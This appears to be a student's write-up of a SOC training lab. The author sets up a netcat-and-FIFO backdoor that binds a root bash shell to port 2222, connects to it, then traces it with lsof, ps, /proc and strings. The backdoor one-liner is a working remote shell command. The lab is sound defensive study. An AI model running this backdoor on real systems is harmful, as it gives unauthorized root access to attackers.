<h1>Linux CLI Lab</h1>



<h2>Languages and Utilities Used</h2>

- <b>Linux</b> 


<h2>Environments Used </h2>

- <b>Ubuntu terminals</b> 
- <b>VM Ware</b>

<h2>Program walk-through:</h2>

<p align="left">
In this Antisyphon lab (part of their fantastic SOC Core skills course with John Strand), I was looking at a backdoor using the Linux CLI.

I used a large number of basic commands to get a better understanding of what the backdoor is and what it does.

For this lab I ran three different Ubuntu terminals.

The first was where we run the backdoor.

The second was where we connect to it.

The third was where we ran the analysis.

<br/>

<br />On the Linux terminal, I used sudo su - to get a root prompt. This was so we could have a backdoor running as root and a connection from a different user account on the system.

  <p align="left">
I next needed to create a fifo backpipe:
    mknod backpipe p
Next, let's start the backdoor with the following command:

/bin/bash  0<backpipe | nc -l 2222 1>backpipe

This was complicated for me but this basically created a backdoor listening on port 2222 of the linux system. 

I had to find the IP address of our linux system using ifconfig command:

<br/>
<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/ifconfig.png" height="80%" width="80%" alt="ifconfig command"/>
<br />

Then we connected via the command

 nc <whatever the ip address is here!> 2222


The following commands made sure it was working

ls

whoami

You can see below I was connected to the simple Linux backdoor as root, as it just dropped the cursor back to the left side of the screen.

<br/>
<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/Clipboard_2020-12-11-07-19-48.png" height="80%" width="80%" alt="ifconfig command"/>
<br />

Next I had to open another Ubuntu terminal to start the analysis. 

I then went back to being root using sudo su - because looking at network connections and process information systemwide requires root access. 

I used the command lsof to look at the network connections and open files. 

When we use the -i flag we are looking at the open Internet connections. When we use the -P flag we are telling lsof to not try and guess what the service is on the ports that are being used. Just give us the port number. 

lsof -i -P

<br/>
<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/lsof.png" height="80%" width="80%" alt="ifconfig command"/>
<br />

Next was digging into the netcat process ID using the lowercase p. This will give us all the open files associated with the listed process ID eg 131.

lsof -p 131

<br/>
<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/lsof%202.png" height="80%" width="80%" alt="ifconfig command"/>
<br />


Let's look at the full processes. We can do this with the ps command. We are also adding the aux switches. This is a for all processes, u for sorted by user and x to include the processes using a teletype terminal.

ps aux

<br/>
<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/lsof%203.png" height="80%" width="80%" alt="ifconfig command"/>
<br />


We had to change directories into the proc directory for that pid. Apparently, proc is a directory that does not exist on the drive. It allows us to see data associated with the various processes directly. This can be very useful as it allows us to dig into the memory of a process that is currently running on a suspect system.

cd /proc/[pid]

I was able to see a number of interesting directories here using the ls command:

ls

<br/>
<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/ls.png" height="80%" width="80%" alt="ifconfig command"/>
<br />

I then ran strings on the exe in this directory. This is very, very useful according to John as when programs are created there may be usage information, mentions of system libraries and possible code comments. We use this all the time to attempt to identify what exactly a program is doing.

strings ./exe

<br/>
<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/strings.png" height="80%" width="80%" alt="ifconfig command"/>
<br />

Hope you enjoyed the walkthrough!
<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
